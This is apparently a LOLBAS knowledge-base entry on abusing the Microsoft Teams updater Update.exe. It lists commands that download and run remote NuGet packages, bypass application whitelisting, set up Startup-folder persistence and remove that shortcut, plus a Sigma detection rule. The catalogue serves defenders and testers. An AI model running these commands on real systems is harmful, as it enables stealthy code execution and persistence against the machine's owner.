---
Acknowledgement:
- Handle: '@reegun21'
  Person: Reegun Richard Jayapaul (SpiderLabs, Trustwave)
- Handle: '@MrUn1k0d3r'
  Person: Mr.Un1k0d3r
- Handle: '@Hexacorn'
  Person: Adam
- Person: Jesus Gal
Author: Oddvar Moe
Code_Sample:
- Code: https://github.com/jreegun/POC-s/tree/master/nuget-squirrel
Commands:
- Category: Download
  Command: Update.exe --download {REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file and download
    the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Usecase: Download binary
- Category: AWL Bypass
  Command: Update.exe --update={REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: Execute
  Command: Update.exe --update={REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: AWL Bypass
  Command: Update.exe --update={PATH_SMB:folder}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package via SAMBA.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: Execute
  Command: Update.exe --update={PATH_SMB:folder}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package via SAMBA.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: AWL Bypass
  Command: Update.exe --updateRollback={REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: Execute
  Command: Update.exe --updateRollback={REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: AWL Bypass
  Command: Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
  Description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\.
    Then run the command. Update.exe will execute the file you copied.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: CMD
  - Execute: Remote
  Usecase: Application Whitelisting Bypass
- Category: AWL Bypass
  Command: Update.exe --updateRollback={PATH_SMB:folder}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package via SAMBA.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: Execute
  Command: Update.exe --updateRollback={PATH_SMB:folder}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package via SAMBA.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: Execute
  Command: Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
  Description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\.
    Then run the command. Update.exe will execute the file you copied.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Execute binary
- Category: Execute
  Command: Update.exe --createShortcut={PATH:.exe} -l=Startup
  Description: Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then
    run the command. Update.exe will create a shortcut to the specified executable
    in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will
    run on every login of the user who runs it.
  MitreID: T1547
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Execute binary
- Category: Execute
  Command: Update.exe --removeShortcut={PATH:.exe}-l=Startup
  Description: Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windows\Start
    Menu\Programs\Startup" directory you created with the LolBinExecution "--createShortcut"
    described on this page.
  MitreID: T1070
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Execute binary
Created: 2019-06-26
Description: Binary to update the existing installed Nuget/squirrel package. Part
  of Microsoft Teams installation.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml
- IOC: Update.exe spawned an unknown process
Full_Path:
- Path: C:\Users\<username>\AppData\Local\Microsoft\Teams\update.exe
Name: Update.exe
Resources:
- Link: https://www.youtube.com/watch?v=rOP3hnkj7ls
- Link: https://twitter.com/reegun21/status/1144182772623269889
- Link: https://twitter.com/MrUn1k0d3r/status/1143928885211537408
- Link: https://twitter.com/reegun21/status/1291005287034281990
- Link: http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
- Link: https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12
- Link: https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56
- Link: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/
mitre_data:
  technique_ids:
  - T1218
  - T1547
  - T1070
tags:
- lolbas/othermsbinaries
---

# Update.exe

Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.

# Path(s)

- `C:\Users\<username>\AppData\Local\Microsoft\Teams\update.exe`

# Execute Commands

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```batch
Update.exe --update={REMOTEURL}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```batch
Update.exe --update={PATH_SMB:folder}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



The above binary will go to url and look for RELEASES file, download and install the nuget package.

```batch
Update.exe --updateRollback={REMOTEURL}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```batch
Update.exe --updateRollback={PATH_SMB:folder}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.

```batch
Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
```

- **Usecase:** Execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the command. Update.exe will create a shortcut to the specified executable in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will run on every login of the user who runs it.

```batch
Update.exe --createShortcut={PATH:.exe} -l=Startup
```

- **Usecase:** Execute binary
- **Privileges Required:** User
- **MitreID:** `T1547`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" directory you created with the LolBinExecution "--createShortcut" described on this page.

```batch
Update.exe --removeShortcut={PATH:.exe}-l=Startup
```

- **Usecase:** Execute binary
- **Privileges Required:** User
- **MitreID:** `T1070`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



# AWL Bypass Commands

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```batch
Update.exe --update={REMOTEURL}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```batch
Update.exe --update={PATH_SMB:folder}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



The above binary will go to url and look for RELEASES file, download and install the nuget package.

```batch
Update.exe --updateRollback={REMOTEURL}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.

```batch
Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
```

- **Usecase:** Application Whitelisting Bypass
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```batch
Update.exe --updateRollback={PATH_SMB:folder}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



# Download Commands

The above binary will go to url and look for RELEASES file and download the nuget package.

```batch
Update.exe --download {REMOTEURL}
```

- **Usecase:** Download binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



# Resource(s)

- https://www.youtube.com/watch?v=rOP3hnkj7ls
- https://twitter.com/reegun21/status/1144182772623269889
- https://twitter.com/MrUn1k0d3r/status/1143928885211537408
- https://twitter.com/reegun21/status/1291005287034281990
- http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
- https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12
- https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56
- https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/
# Acknowledgements

- Oddvar Moe (Authored, 2019-06-26)
- Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21)
- Mr.Un1k0d3r (@MrUn1k0d3r)
- Adam (@Hexacorn)
- Jesus Gal